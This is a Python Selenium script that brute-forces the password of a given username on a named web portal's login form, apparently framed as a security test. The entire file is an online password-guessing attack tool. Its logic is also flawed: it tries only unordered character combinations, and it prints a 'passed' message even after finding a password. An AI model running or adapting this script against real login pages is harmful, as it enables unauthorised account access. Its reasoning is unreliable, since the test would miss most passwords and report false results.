from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import itertools
import time

def every_combination(n):
    generator=itertools.combinations_with_replacement('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~', n )
    return list(generator)

print("Please input the password length you want to test. eg:2")
n=int(input())
print("Please enter the username")
username_str=input()
options=webdriver.ChromeOptions()
options.binary_location="C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
chrome_driver=r"C:\Users\x1301\Desktop\chromedriver.exe"
driver=webdriver.Chrome(chrome_driver,chrome_options=options)

password_list=every_combination(n)
driver.get("https://ourportal.shohamc1.com/")
login_botton=driver.find_element_by_link_text("Login").click()
time.sleep(1)

username=driver.find_element_by_css_selector("[type='email']")
username.send_keys(username_str)
#n invalid ones
for each in password_list:
    password=driver.find_element_by_css_selector("[type='password']")
    password.clear()
    password.send_keys(each)
    driver.find_element_by_css_selector("button").click()
    try:
        assert "menu-log-out" in driver.page_source
        print("Test failed, find password {} for the given username".format(each))
        break
    except:
        continue
print("Test has passed, did not find password.")